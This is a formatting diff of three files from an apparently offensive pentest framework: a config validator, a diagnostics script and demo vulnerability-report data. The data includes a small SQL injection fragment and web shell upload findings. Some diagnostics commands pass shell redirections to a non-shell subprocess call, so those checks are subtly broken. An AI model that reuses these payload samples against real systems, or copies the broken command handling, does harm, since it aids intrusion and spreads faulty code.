\"allowed_values\": [\"critical\", \"high\", \"medium\", \"low\", \"info\"],\n+                },\n+                \"update_interval\": {\n+                    \"type\": int,\n+                    \"min\": 1,\n+                    \"max\": 168,\n+                    \"optional\": True,\n+                },\n+                \"custom_templates\": {\"type\": bool, \"optional\": True},\n+                \"enabled\": {\"type\": bool, \"optional\": True},\n+                \"rps\": {\"type\": int, \"min\": 1, \"max\": 10000, \"optional\": True},\n+                \"conc\": {\"type\": int, \"min\": 1, \"max\": 500, \"optional\": True},\n+                \"timeout\": {\"type\": int, \"min\": 1, \"max\": 300, \"optional\": True},\n+                \"retries\": {\"type\": int, \"min\": 0, \"max\": 10, \"optional\": True},\n+                \"all_templates\": {\"type\": bool, \"optional\": True},\n+            },\n+            \"report\": {\n+                \"format\": {\n+                    \"type\": list,\n+                    \"allowed_values\": [\"html\", \"json\", \"csv\", \"xml\"],\n+                    \"optional\": True,\n+                },\n+                \"formats\": {\n+                    \"type\": list,\n+                    \"allowed_values\": [\"html\", \"json\", \"csv\", \"xml\"],\n+                    \"optional\": True,\n+                },\n+                \"include_screenshots\": {\"type\": bool, \"optional\": True},\n+                \"detailed_analysis\": {\"type\": bool, \"optional\": True},\n+            },\n+            \"repos\": {\n+                \"seclists\": {\"type\": str, \"pattern\": r\"^https?://.*\", \"optional\": True},\n+                \"payloads\": {\"type\": str, \"pattern\": r\"^https?://.*\", \"optional\": True},\n+                \"wordlists\": {\n+                    \"type\": str,\n+                    \"pattern\": r\"^https?://.*\",\n+                    \"optional\": True,\n+                },\n+                \"SecLists\": {\"type\": str, \"pattern\": r\"^https?://.*\", \"optional\": True},\n+                \"PayloadsAllTheThings\": {\n+                    \"type\": str,\n+                    \"pattern\": r\"^https?://.*\",\n+                    \"optional\": True,\n+                },\n+                \"Wordlists\": {\n+                    \"type\": str,\n+                    \"pattern\": r\"^https?://.*\",\n+                    \"optional\": True,\n+                },\n+                \"NucleiTemplates\": {\n+                    \"type\": str,\n+                    \"pattern\": r\"^https?://.*\",\n+                    \"optional\": True,\n+                },\n+                \"Exploits\": {\"type\": str, \"pattern\": r\"^https?://.*\", \"optional\": True},\n             },\n             # Additional sections that may exist in the config\n-            'bcar': {'_allow_any': True},\n-            'payload_injection': {'_allow_any': True},\n-            'performance': {'_allow_any': True},\n-            'resource_management': {'_allow_any': True},\n-            'fuzzing': {'_allow_any': True},\n-            'validation': {'_allow_any': True},\n-            'scanning': {'_allow_any': True},\n-            'fallback': {'_allow_any': True},\n-            'plugins': {'_allow_any': True},\n-            'reliability': {'_allow_any': True},\n-            'notifications': {'_allow_any': True},\n-            'security': {'_allow_any': True},\n-            'output': {'_allow_any': True}\n+            \"bcar\": {\"_allow_any\": True},\n+            \"payload_injection\": {\"_allow_any\": True},\n+            \"performance\": {\"_allow_any\": True},\n+            \"resource_management\": {\"_allow_any\": True},\n+            \"fuzzing\": {\"_allow_any\": True},\n+            \"validation\": {\"_allow_any\": True},\n+            \"scanning\": {\"_allow_any\": True},\n+            \"fallback\": {\"_allow_any\": True},\n+            \"plugins\": {\"_allow_any\": True},\n+            \"reliability\": {\"_allow_any\": True},\n+            \"notifications\": {\"_allow_any\": True},\n+            \"security\": {\"_allow_any\": True},\n+            \"output\": {\"_allow_any\": True},\n         }\n-    \n+\n     def validate_config(self, config: Dict[str, Any]) -> Dict[str, Any]:\n         \"\"\"\n         Validate configuration against rules\n-        \n+\n         Args:\n             config: Configuration dictionary to validate\n-            \n+\n         Returns:\n             Dict with validation results\n         \"\"\"\n-        result = {\n-            'valid': True,\n-            'errors': [],\n-            'warnings': [],\n-            'sections_validated': 0\n-        }\n-        \n+        result = {\"valid\": True, \"errors\": [], \"warnings\": [], \"sections_validated\": 0}\n+\n         try:\n             # Validate each section\n             for section_name, section_rules in self.validation_rules.items():\n                 if section_name in config:\n                     section_result = self._validate_section(\n                         config[section_name], section_rules, section_name\n                     )\n-                    result['errors'].extend(section_result['errors'])\n-                    result['warnings'].extend(section_result['warnings'])\n-                    result['sections_validated'] += 1\n+                    result[\"errors\"].extend(section_result[\"errors\"])\n+                    result[\"warnings\"].extend(section_result[\"warnings\"])\n+                    result[\"sections_validated\"] += 1\n                 else:\n-                    result['warnings'].append(f\"Optional section '{section_name}' not found in config\")\n-            \n+                    result[\"warnings\"].append(\n+                        f\"Optional section '{section_name}' not found in config\"\n+                    )\n+\n             # Check for unknown sections\n             known_sections = set(self.validation_rules.keys())\n             config_sections = set(config.keys())\n             unknown_sections = config_sections - known_sections\n-            \n+\n             for unknown in unknown_sections:\n-                result['warnings'].append(f\"Unknown configuration section: '{unknown}'\")\n-            \n+                result[\"warnings\"].append(f\"Unknown configuration section: '{unknown}'\")\n+\n             # Set overall validity\n-            result['valid'] = len(result['errors']) == 0\n-            \n+            result[\"valid\"] = len(result[\"errors\"]) == 0\n+\n         except Exception as e:\n-            result['valid'] = False\n-            result['errors'].append(f\"Configuration validation failed: {str(e)}\")\n-        \n+            result[\"valid\"] = False\n+            result[\"errors\"].append(f\"Configuration validation failed: {str(e)}\")\n+\n         return result\n-    \n-    def _validate_section(self, section_data: Dict[str, Any], rules: Dict[str, Any], section_name: str) -> Dict[str, Any]:\n+\n+    def _validate_section(\n+        self, section_data: Dict[str, Any], rules: Dict[str, Any], section_name: str\n+    ) -> Dict[str, Any]:\n         \"\"\"Validate a configuration section against its rules\"\"\"\n-        result = {'errors': [], 'warnings': []}\n-        \n+        result = {\"errors\": [], \"warnings\": []}\n+\n         # Special case: if _allow_any is True, skip detailed validation\n-        if rules.get('_allow_any', False):\n+        if rules.get(\"_allow_any\", False):\n             return result\n-        \n+\n         for key, rule in rules.items():\n-            if key == '_allow_any':\n+            if key == \"_allow_any\":\n                 continue\n-                \n+\n             if key in section_data:\n                 value = section_data[key]\n-                validation_result = self._validate_value(value, rule, f\"{section_name}.{key}\")\n-                result['errors'].extend(validation_result['errors'])\n-                result['warnings'].extend(validation_result['warnings'])\n+                validation_result = self._validate_value(\n+                    value, rule, f\"{section_name}.{key}\"\n+                )\n+                result[\"errors\"].extend(validation_result[\"errors\"])\n+                result[\"warnings\"].extend(validation_result[\"warnings\"])\n             else:\n-                if not rule.get('optional', False):\n-                    result['warnings'].append(f\"Optional setting '{section_name}.{key}' not found\")\n-        \n+                if not rule.get(\"optional\", False):\n+                    result[\"warnings\"].append(\n+                        f\"Optional setting '{section_name}.{key}' not found\"\n+                    )\n+\n         # Check for unknown keys in section (only if not _allow_any)\n-        if not rules.get('_allow_any', False):\n-            known_keys = set(key for key in rules.keys() if key != '_allow_any')\n+        if not rules.get(\"_allow_any\", False):\n+            known_keys = set(key for key in rules.keys() if key != \"_allow_any\")\n             section_keys = set(section_data.keys())\n             unknown_keys = section_keys - known_keys\n-            \n+\n             for unknown in unknown_keys:\n-                result['warnings'].append(f\"Unknown setting in {section_name}: '{unknown}'\")\n-        \n+                result[\"warnings\"].append(\n+                    f\"Unknown setting in {section_name}: '{unknown}'\"\n+                )\n+\n         return result\n-    \n-    def _validate_value(self, value: Any, rule: Dict[str, Any], field_path: str) -> Dict[str, Any]:\n+\n+    def _validate_value(\n+        self, value: Any, rule: Dict[str, Any], field_path: str\n+    ) -> Dict[str, Any]:\n         \"\"\"Validate a single value against its rule\"\"\"\n-        result = {'errors': [], 'warnings': []}\n-        \n+        result = {\"errors\": [], \"warnings\": []}\n+\n         # Type validation (handle tuple types for multiple allowed types)\n-        expected_type = rule.get('type')\n+        expected_type = rule.get(\"type\")\n         if expected_type:\n             if isinstance(expected_type, tuple):\n                 # Multiple types allowed\n                 if not any(isinstance(value, t) for t in expected_type):\n                     type_names = [t.__name__ for t in expected_type]\n-                    result['errors'].append(f\"{field_path}: Expected {' or '.join(type_names)}, got {type(value).__name__}\")\n+                    result[\"errors\"].append(\n+                        f\"{field_path}: Expected {' or '.join(type_names)}, got {type(value).__name__}\"\n+                    )\n                     return result\n             else:\n                 # Single type expected\n                 if not isinstance(value, expected_type):\n-                    result['errors'].append(f\"{field_path}: Expected {expected_type.__name__}, got {type(value).__name__}\")\n+                    result[\"errors\"].append(\n+                        f\"{field_path}: Expected {expected_type.__name__}, got {type(value).__name__}\"\n+                    )\n                     return result\n-        \n+\n         # Range validation for numbers\n         if isinstance(value, (int, float)):\n-            if 'min' in rule and value < rule['min']:\n-                result['errors'].append(f\"{field_path}: Value {value} is below minimum {rule['min']}\")\n-            if 'max' in rule and value > rule['max']:\n-                result['errors'].append(f\"{field_path}: Value {value} is above maximum {rule['max']}\")\n-        \n+            if \"min\" in rule and value < rule[\"min\"]:\n+                result[\"errors\"].append(\n+                    f\"{field_path}: Value {value} is below minimum {rule['min']}\"\n+                )\n+            if \"max\" in rule and value > rule[\"max\"]:\n+                result[\"errors\"].append(\n+                    f\"{field_path}: Value {value} is above maximum {rule['max']}\"\n+                )\n+\n         # Pattern validation for strings\n-        if isinstance(value, str) and 'pattern' in rule:\n-            pattern = rule['pattern']\n+        if isinstance(value, str) and \"pattern\" in rule:\n+            pattern = rule[\"pattern\"]\n             if not re.match(pattern, value):\n-                result['errors'].append(f\"{field_path}: Value '{value}' does not match pattern '{pattern}'\")\n-        \n+                result[\"errors\"].append(\n+                    f\"{field_path}: Value '{value}' does not match pattern '{pattern}'\"\n+                )\n+\n         # Allowed values validation for lists and strings\n-        if 'allowed_values' in rule:\n-            allowed = rule['allowed_values']\n+        if \"allowed_values\" in rule:\n+            allowed = rule[\"allowed_values\"]\n             if isinstance(value, list):\n                 for item in value:\n                     if item not in allowed:\n-                        result['errors'].append(f\"{field_path}: Invalid list item '{item}'. Allowed: {allowed}\")\n+                        result[\"errors\"].append(\n+                            f\"{field_path}: Invalid list item '{item}'. Allowed: {allowed}\"\n+                        )\n             elif isinstance(value, str):\n                 # Handle comma-separated string (like nuclei severity)\n-                if ',' in value:\n-                    items = [item.strip() for item in value.split(',')]\n+                if \",\" in value:\n+                    items = [item.strip() for item in value.split(\",\")]\n                     for item in items:\n                         if item not in allowed:\n-                            result['errors'].append(f\"{field_path}: Invalid severity '{item}'. Allowed: {allowed}\")\n+                            result[\"errors\"].append(\n+                                f\"{field_path}: Invalid severity '{item}'. Allowed: {allowed}\"\n+                            )\n                 else:\n                     if value not in allowed:\n-                        result['errors'].append(f\"{field_path}: Invalid value '{value}'. Allowed: {allowed}\")\n+                        result[\"errors\"].append(\n+                            f\"{field_path}: Invalid value '{value}'. Allowed: {allowed}\"\n+                        )\n             elif value not in allowed:\n-                result['errors'].append(f\"{field_path}: Invalid value '{value}'. Allowed: {allowed}\")\n-        \n+                result[\"errors\"].append(\n+                    f\"{field_path}: Invalid value '{value}'. Allowed: {allowed}\"\n+                )\n+\n         return result\n-    \n+\n     def validate_file(self, config_path: Path) -> Dict[str, Any]:\n         \"\"\"\n         Validate a configuration file\n-        \n+\n         Args:\n             config_path: Path to the configuration file\n-            \n+\n         Returns:\n             Dict with validation results\n         \"\"\"\n         result = {\n-            'valid': False,\n-            'errors': [],\n-            'warnings': [],\n-            'file_path': str(config_path)\n+            \"valid\": False,\n+            \"errors\": [],\n+            \"warnings\": [],\n+            \"file_path\": str(config_path),\n         }\n-        \n+\n         try:\n             if not config_path.exists():\n-                result['errors'].append(f\"Configuration file not found: {config_path}\")\n+                result[\"errors\"].append(f\"Configuration file not found: {config_path}\")\n                 return result\n-            \n+\n             # Load JSON configuration\n-            with open(config_path, 'r', encoding='utf-8') as f:\n+            with open(config_path, \"r\", encoding=\"utf-8\") as f:\n                 config = json.load(f)\n-            \n+\n             # Validate the loaded configuration\n             validation_result = self.validate_config(config)\n             result.update(validation_result)\n-            \n+\n         except json.JSONDecodeError as e:\n-            result['errors'].append(f\"Invalid JSON in configuration file: {str(e)}\")\n+            result[\"errors\"].append(f\"Invalid JSON in configuration file: {str(e)}\")\n         except Exception as e:\n-            result['errors'].append(f\"Error reading configuration file: {str(e)}\")\n-        \n+            result[\"errors\"].append(f\"Error reading configuration file: {str(e)}\")\n+\n         return result\n-    \n+\n     def get_default_config(self) -> Dict[str, Any]:\n         \"\"\"Get a default valid configuration\"\"\"\n         return {\n-            'limits': {\n-                'parallel_jobs': 10,\n-                'http_timeout': 30,\n-                'max_results': 1000,\n-                'rate_limit': 1.0\n-            },\n-            'nuclei': {\n-                'severity': ['critical', 'high', 'medium'],\n-                'update_interval': 24,\n-                'custom_templates': True\n-            },\n-            'report': {\n-                'format': ['html', 'json'],\n-                'include_screenshots': True,\n-                'detailed_analysis': True\n-            },\n-            'repos': {\n-                'seclists': 'https://github.com/danielmiessler/SecLists.git',\n-                'payloads': 'https://github.com/swisskyrepo/PayloadsAllTheThings.git',\n-                'wordlists': 'https://github.com/assetnote/commonspeak2-wordlists.git'\n-            }\n+            \"limits\": {\n+                \"parallel_jobs\": 10,\n+                \"http_timeout\": 30,\n+                \"max_results\": 1000,\n+                \"rate_limit\": 1.0,\n+            },\n+            \"nuclei\": {\n+                \"severity\": [\"critical\", \"high\", \"medium\"],\n+                \"update_interval\": 24,\n+                \"custom_templates\": True,\n+            },\n+            \"report\": {\n+                \"format\": [\"html\", \"json\"],\n+                \"include_screenshots\": True,\n+                \"detailed_analysis\": True,\n+            },\n+            \"repos\": {\n+                \"seclists\": \"https://github.com/danielmiessler/SecLists.git\",\n+                \"payloads\": \"https://github.com/swisskyrepo/PayloadsAllTheThings.git\",\n+                \"wordlists\": \"https://github.com/assetnote/commonspeak2-wordlists.git\",\n+            },\n         }\n-    \n+\n     def generate_config_template(self, output_path: Optional[Path] = None) -> str:\n         \"\"\"Generate a configuration template with comments\"\"\"\n         template = \"\"\"// Bl4ckC3ll_PANTHEON Configuration Template\n // This file contains all available configuration options with examples\n {\n@@ -299,72 +371,74 @@\n         \"payloads\": \"https://github.com/swisskyrepo/PayloadsAllTheThings.git\",\n         \"wordlists\": \"https://github.com/assetnote/commonspeak2-wordlists.git\"\n     }\n }\n \"\"\"\n-        \n+\n         if output_path:\n-            with open(output_path, 'w', encoding='utf-8') as f:\n+            with open(output_path, \"w\", encoding=\"utf-8\") as f:\n                 f.write(template)\n-        \n+\n         return template\n \n \n def validate_config_file(file_path: str) -> bool:\n     \"\"\"\n     Convenience function to validate a configuration file\n-    \n+\n     Args:\n         file_path: Path to the configuration file\n-        \n+\n     Returns:\n         True if valid, False otherwise\n     \"\"\"\n     validator = ConfigValidator()\n     result = validator.validate_file(Path(file_path))\n-    \n-    if result['valid']:\n+\n+    if result[\"valid\"]:\n         print(f\"\u2705 Configuration file '{file_path}' is valid\")\n-        if result['warnings']:\n+        if result[\"warnings\"]:\n             print(\"\u26a0\ufe0f  Warnings:\")\n-            for warning in result['warnings']:\n+            for warning in result[\"warnings\"]:\n                 print(f\"   - {warning}\")\n         return True\n     else:\n         print(f\"\u274c Configuration file '{file_path}' is invalid\")\n         print(\"Errors:\")\n-        for error in result['errors']:\n+        for error in result[\"errors\"]:\n             print(f\"   - {error}\")\n-        if result['warnings']:\n+        if result[\"warnings\"]:\n             print(\"Warnings:\")\n-            for warning in result['warnings']:\n+            for warning in result[\"warnings\"]:\n                 print(f\"   - {warning}\")\n         return False\n \n \n if __name__ == \"__main__\":\n     # Example usage and testing\n     print(\"Config Validator Test\")\n     print(\"=\" * 50)\n-    \n+\n     validator = ConfigValidator()\n-    \n+\n     # Test with default config\n     default_config = validator.get_default_config()\n     result = validator.validate_config(default_config)\n     print(f\"Default config validation: {'\u2705 PASS' if result['valid'] else '\u274c FAIL'}\")\n-    \n+\n     # Test with invalid config\n     invalid_config = {\n-        'limits': {\n-            'parallel_jobs': -1,  # Invalid: below minimum\n-            'http_timeout': 999   # Invalid: above maximum\n+        \"limits\": {\n+            \"parallel_jobs\": -1,  # Invalid: below minimum\n+            \"http_timeout\": 999,  # Invalid: above maximum\n         }\n     }\n     result = validator.validate_config(invalid_config)\n-    print(f\"Invalid config detection: {'\u2705 PASS' if not result['valid'] else '\u274c FAIL'}\")\n-    \n+    print(\n+        f\"Invalid config detection: {'\u2705 PASS' if not result['valid'] else '\u274c FAIL'}\"\n+    )\n+\n     # Test config file validation if p4nth30n.cfg.json exists\n     config_file = Path(\"p4nth30n.cfg.json\")\n     if config_file.exists():\n         print(f\"\\nValidating existing config file: {config_file}\")\n-        validate_config_file(str(config_file))\n\\ No newline at end of file\n+        validate_config_file(str(config_file))\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/diagnostics.py\t2025-09-14 19:10:58.550754+00:00\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/diagnostics.py\t2025-09-14 19:23:10.235530+00:00\n@@ -9,234 +9,267 @@\n import shutil\n import subprocess\n import platform\n from pathlib import Path\n \n+\n def print_header(title):\n     print(f\"\\n{'='*50}\")\n     print(f\"  {title}\")\n     print(f\"{'='*50}\")\n \n+\n def print_section(title):\n     print(f\"\\n{'-'*30}\")\n     print(f\"  {title}\")\n     print(f\"{'-'*30}\")\n+\n \n def check_status(condition, message):\n     status = \"\u2713\" if condition else \"\u2717\"\n     color = \"\\033[92m\" if condition else \"\\033[91m\"\n     reset = \"\\033[0m\"\n     print(f\"{color}{status}{reset} {message}\")\n     return condition\n \n+\n def run_command(cmd, capture=True):\n     \"\"\"Run command and return result\"\"\"\n     try:\n         if capture:\n             # SECURITY FIX: Use argument list instead of shell=True\n             import shlex\n+\n             cmd_args = shlex.split(cmd) if isinstance(cmd, str) else cmd\n-            result = subprocess.run(cmd_args, shell=False, capture_output=True, text=True, timeout=10)\n+            result = subprocess.run(\n+                cmd_args, shell=False, capture_output=True, text=True, timeout=10\n+            )\n             return result.returncode == 0, result.stdout.strip(), result.stderr.strip()\n         else:\n             import shlex\n+\n             cmd_args = shlex.split(cmd) if isinstance(cmd, str) else cmd\n             result = subprocess.run(cmd_args, shell=False, timeout=10)\n             return result.returncode == 0, \"\", \"\"\n     except Exception as e:\n         return False, \"\", str(e)\n \n+\n def main():\n     print_header(\"Bl4ckC3ll_PANTHEON Diagnostics\")\n-    \n+\n     # System information\n     print_section(\"System Information\")\n     print(f\"Operating System: {platform.system()} {platform.release()}\")\n     print(f\"Architecture: {platform.machine()}\")\n     print(f\"Python Version: {sys.version}\")\n     print(f\"Current Directory: {Path.cwd()}\")\n-    \n+\n     # Python environment\n     print_section(\"Python Environment\")\n-    \n+\n     # Python version check\n     py_version = sys.version_info\n     check_status(\n         py_version.major >= 3 and py_version.minor >= 9,\n-        f\"Python 3.9+ requirement (found {py_version.major}.{py_version.minor})\"\n+        f\"Python 3.9+ requirement (found {py_version.major}.{py_version.minor})\",\n     )\n-    \n+\n     # Pip availability\n     pip_available, pip_version, _ = run_command(\"python3 -m pip --version\")\n-    check_status(pip_available, f\"pip available ({pip_version.split()[1] if pip_available else 'Not found'})\")\n-    \n+    check_status(\n+        pip_available,\n+        f\"pip available ({pip_version.split()[1] if pip_available else 'Not found'})\",\n+    )\n+\n     # Python packages\n     print_section(\"Python Dependencies\")\n-    \n+\n     packages = {\n-        'psutil': 'System monitoring',\n-        'distro': 'OS detection',\n-        'requests': 'HTTP requests (optional)'\n+        \"psutil\": \"System monitoring\",\n+        \"distro\": \"OS detection\",\n+        \"requests\": \"HTTP requests (optional)\",\n     }\n-    \n+\n     for package, description in packages.items():\n         try:\n             __import__(package)\n             check_status(True, f\"{package} - {description}\")\n         except ImportError:\n             check_status(False, f\"{package} - {description}\")\n-    \n+\n     # Go environment\n     print_section(\"Go Environment\")\n-    \n+\n     go_available, go_version, _ = run_command(\"go version\")\n-    check_status(go_available, f\"Go compiler ({go_version if go_available else 'Not found'})\")\n-    \n+    check_status(\n+        go_available, f\"Go compiler ({go_version if go_available else 'Not found'})\"\n+    )\n+\n     if go_available:\n-        gopath = os.environ.get('GOPATH', 'Not set')\n-        gobin = os.environ.get('GOBIN', 'Not set')\n+        gopath = os.environ.get(\"GOPATH\", \"Not set\")\n+        gobin = os.environ.get(\"GOBIN\", \"Not set\")\n         print(f\"  GOPATH: {gopath}\")\n         print(f\"  GOBIN: {gobin}\")\n-        \n+\n         # Check Go bin in PATH\n         go_bin_path = Path.home() / \"go\" / \"bin\"\n         path_env = os.environ.get(\"PATH\", \"\")\n         check_status(\n-            str(go_bin_path) in path_env,\n-            f\"Go bin directory in PATH ({go_bin_path})\"\n-        )\n-    \n+            str(go_bin_path) in path_env, f\"Go bin directory in PATH ({go_bin_path})\"\n+        )\n+\n     # Security tools\n     print_section(\"Security Tools\")\n-    \n+\n     tools = {\n-        'subfinder': 'Subdomain discovery',\n-        'httpx': 'HTTP probing',\n-        'naabu': 'Port scanning',\n-        'nuclei': 'Vulnerability scanning',\n-        'katana': 'Web crawling',\n-        'gau': 'URL gathering',\n-        'amass': 'Asset discovery (optional)'\n+        \"subfinder\": \"Subdomain discovery\",\n+        \"httpx\": \"HTTP probing\",\n+        \"naabu\": \"Port scanning\",\n+        \"nuclei\": \"Vulnerability scanning\",\n+        \"katana\": \"Web crawling\",\n+        \"gau\": \"URL gathering\",\n+        \"amass\": \"Asset discovery (optional)\",\n     }\n-    \n+\n     available_tools = 0\n     for tool, description in tools.items():\n         available = shutil.which(tool) is not None\n         if available:\n             # Get version if possible\n-            version_available, version_output, _ = run_command(f\"{tool} -version 2>/dev/null || {tool} --version 2>/dev/null || echo 'version unknown'\")\n-            version_info = version_output.split('\\n')[0] if version_available else 'version unknown'\n+            version_available, version_output, _ = run_command(\n+                f\"{tool} -version 2>/dev/null || {tool} --version 2>/dev/null || echo 'version unknown'\"\n+            )\n+            version_info = (\n+                version_output.split(\"\\n\")[0]\n+                if version_available\n+                else \"version unknown\"\n+            )\n             check_status(True, f\"{tool} - {description} ({version_info})\")\n             available_tools += 1\n         else:\n             check_status(False, f\"{tool} - {description}\")\n-    \n+\n     print(f\"\\nTotal tools available: {available_tools}/{len(tools)}\")\n-    \n+\n     # Essential system tools\n     print_section(\"Essential System Tools\")\n-    \n-    essential = ['git', 'wget', 'unzip', 'curl']\n+\n+    essential = [\"git\", \"wget\", \"unzip\", \"curl\"]\n     for tool in essential:\n         available = shutil.which(tool) is not None\n         check_status(available, f\"{tool}\")\n-    \n+\n     # File system checks\n     print_section(\"File System\")\n-    \n+\n     script_dir = Path(__file__).parent\n-    \n+\n     # Required files\n     required_files = [\n-        'bl4ckc3ll_p4nth30n.py',\n-        'requirements.txt',\n-        'install.sh',\n-        'quickstart.sh',\n-        'p4nth30n.cfg.json',\n-        'targets.txt'\n+        \"bl4ckc3ll_p4nth30n.py\",\n+        \"requirements.txt\",\n+        \"install.sh\",\n+        \"quickstart.sh\",\n+        \"p4nth30n.cfg.json\",\n+        \"targets.txt\",\n     ]\n-    \n+\n     for file in required_files:\n         file_path = script_dir / file\n         exists = file_path.exists()\n         if exists:\n             size = file_path.stat().st_size\n             check_status(True, f\"{file} ({size} bytes)\")\n         else:\n             check_status(False, f\"{file}\")\n-    \n+\n     # Directory structure\n     directories = [\n-        'runs', 'logs', 'external_lists', 'lists_merged',\n-        'payloads', 'exploits', 'plugins', 'backups'\n+        \"runs\",\n+        \"logs\",\n+        \"external_lists\",\n+        \"lists_merged\",\n+        \"payloads\",\n+        \"exploits\",\n+        \"plugins\",\n+        \"backups\",\n     ]\n-    \n+\n     for directory in directories:\n         dir_path = script_dir / directory\n         exists = dir_path.exists() and dir_path.is_dir()\n         check_status(exists, f\"Directory: {directory}\")\n-    \n+\n     # Write permissions\n     try:\n-        test_file = script_dir / '.write_test'\n+        test_file = script_dir / \".write_test\"\n         test_file.touch()\n         test_file.unlink()\n         check_status(True, \"Write permissions in script directory\")\n     except Exception:\n         check_status(False, \"Write permissions in script directory\")\n-    \n+\n     # Configuration validation\n     print_section(\"Configuration\")\n-    \n-    config_file = script_dir / 'p4nth30n.cfg.json'\n+\n+    config_file = script_dir / \"p4nth30n.cfg.json\"\n     if config_file.exists():\n         try:\n             import json\n+\n             with open(config_file) as f:\n                 config = json.load(f)\n             check_status(True, \"Configuration file is valid JSON\")\n-            \n+\n             # Check key sections\n-            required_sections = ['repos', 'limits', 'nuclei', 'report']\n+            required_sections = [\"repos\", \"limits\", \"nuclei\", \"report\"]\n             for section in required_sections:\n                 has_section = section in config\n                 check_status(has_section, f\"Configuration section: {section}\")\n-                \n+\n         except json.JSONDecodeError:\n             check_status(False, \"Configuration file is invalid JSON\")\n         except Exception as e:\n             check_status(False, f\"Configuration file error: {e}\")\n     else:\n         check_status(False, \"Configuration file missing\")\n-    \n+\n     # Network connectivity\n     print_section(\"Network Connectivity\")\n-    \n+\n     # Test basic connectivity\n     connectivity_ok, _, _ = run_command(\"ping -c 1 google.com > /dev/null 2>&1\")\n     check_status(connectivity_ok, \"Internet connectivity\")\n-    \n+\n     if connectivity_ok:\n         # Test GitHub access\n-        github_ok, _, _ = run_command(\"curl -s --max-time 5 https://api.github.com/zen > /dev/null\")\n+        github_ok, _, _ = run_command(\n+            \"curl -s --max-time 5 https://api.github.com/zen > /dev/null\"\n+        )\n         check_status(github_ok, \"GitHub API access\")\n-        \n+\n         # Test Go proxy\n-        goproxy_ok, _, _ = run_command(\"curl -s --max-time 5 https://proxy.golang.org > /dev/null\")\n+        goproxy_ok, _, _ = run_command(\n+            \"curl -s --max-time 5 https://proxy.golang.org > /dev/null\"\n+        )\n         check_status(goproxy_ok, \"Go module proxy access\")\n-    \n+\n     # Summary\n     print_section(\"Summary\")\n-    \n+\n     if available_tools >= 4:\n         print(\"\ud83c\udf89 Installation looks good! Most tools are available.\")\n     elif available_tools >= 2:\n-        print(\"\u26a0\ufe0f  Partial installation. Some tools are missing but core functionality should work.\")\n+        print(\n+            \"\u26a0\ufe0f  Partial installation. Some tools are missing but core functionality should work.\"\n+        )\n     else:\n         print(\"\u274c Installation issues detected. Run install.sh to fix.\")\n-    \n+\n     print(f\"\\nFor installation help, run: ./install.sh\")\n     print(f\"For quick start, run: ./quickstart.sh\")\n     print(f\"To start the application: python3 bl4ckc3ll_p4nth30n.py\")\n \n+\n if __name__ == \"__main__\":\n-    main()\n\\ No newline at end of file\n+    main()\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/demo_enhanced_reporting.py\t2025-09-14 19:10:58.550754+00:00\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/demo_enhanced_reporting.py\t2025-09-14 19:23:10.371650+00:00\n@@ -13,466 +13,544 @@\n import sys\n \n # Add current directory to path for imports\n sys.path.insert(0, str(Path(__file__).parent))\n \n+\n def create_demo_data():\n     \"\"\"Create demonstration vulnerability and recon data\"\"\"\n-    \n+\n     # Sample vulnerability data representing a comprehensive security assessment\n     demo_vulnerabilities = [\n         {\n             \"info\": {\n                 \"name\": \"Critical SQL Injection in Authentication\",\n-                \"severity\": \"critical\", \n-                \"description\": \"SQL injection vulnerability in login endpoint allowing authentication bypass and database access\"\n+                \"severity\": \"critical\",\n+                \"description\": \"SQL injection vulnerability in login endpoint allowing authentication bypass and database access\",\n             },\n             \"template-id\": \"sqli-auth-bypass\",\n             \"matched-at\": \"https://demo.example.com/login\",\n-            \"response\": \"MySQL error: 'admin'-- detected\"\n+            \"response\": \"MySQL error: 'admin'-- detected\",\n         },\n         {\n             \"info\": {\n                 \"name\": \"Remote Code Execution via File Upload\",\n                 \"severity\": \"critical\",\n-                \"description\": \"Unrestricted file upload allows execution of malicious code\"\n+                \"description\": \"Unrestricted file upload allows execution of malicious code\",\n             },\n             \"template-id\": \"rce-file-upload\",\n             \"matched-at\": \"https://demo.example.com/upload\",\n-            \"response\": \"PHP shell uploaded successfully\"\n+            \"response\": \"PHP shell uploaded successfully\",\n         },\n         {\n             \"info\": {\n                 \"name\": \"Reflected Cross-Site Scripting\",\n                 \"severity\": \"high\",\n-                \"description\": \"XSS vulnerability in search functionality\"\n+                \"description\": \"XSS vulnerability in search functionality\",\n             },\n             \"template-id\": \"xss-reflected-search\",\n             \"matched-at\": \"https://demo.example.com/search\",\n-            \"response\": \"XSS payload executed in response\"\n+            \"response\": \"XSS payload executed in response\",\n         },\n         {\n             \"info\": {\n                 \"name\": \"Sensitive Data Exposure\",\n                 \"severity\": \"high\",\n-                \"description\": \"API endpoints exposing user personal information\"\n+                \"description\": \"API endpoints exposing user personal information\",\n             },\n             \"template-id\": \"sensitive-data-api\",\n             \"matched-at\": \"https://api.demo.example.com/users\",\n-            \"response\": \"User PII data exposed\"\n+            \"response\": \"User PII data exposed\",\n         },\n         {\n             \"info\": {\n                 \"name\": \"Weak SSL/TLS Configuration\",\n                 \"severity\": \"medium\",\n-                \"description\": \"Server supports weak cipher suites and protocols\"\n+                \"description\": \"Server supports weak cipher suites and protocols\",\n             },\n             \"template-id\": \"ssl-weak-config\",\n             \"matched-at\": \"https://demo.example.com\",\n-            \"response\": \"TLS 1.0 and RC4 cipher detected\"\n+            \"response\": \"TLS 1.0 and RC4 cipher detected\",\n         },\n         {\n             \"info\": {\n                 \"name\": \"Missing Security Headers\",\n                 \"severity\": \"medium\",\n-                \"description\": \"Critical security headers not implemented\"\n+                \"description\": \"Critical security headers not implemented\",\n             },\n             \"template-id\": \"missing-security-headers\",\n             \"matched-at\": \"https://demo.example.com\",\n-            \"response\": \"X-Frame-Options, CSP, HSTS missing\"\n+            \"response\": \"X-Frame-Options, CSP, HSTS missing\",\n         },\n         {\n             \"info\": {\n                 \"name\": \"Default Credentials\",\n                 \"severity\": \"medium\",\n-                \"description\": \"Default administrative credentials found\"\n+                \"description\": \"Default administrative credentials found\",\n             },\n             \"template-id\": \"default-creds-admin\",\n             \"matched-at\": \"https://admin.demo.example.com\",\n-            \"response\": 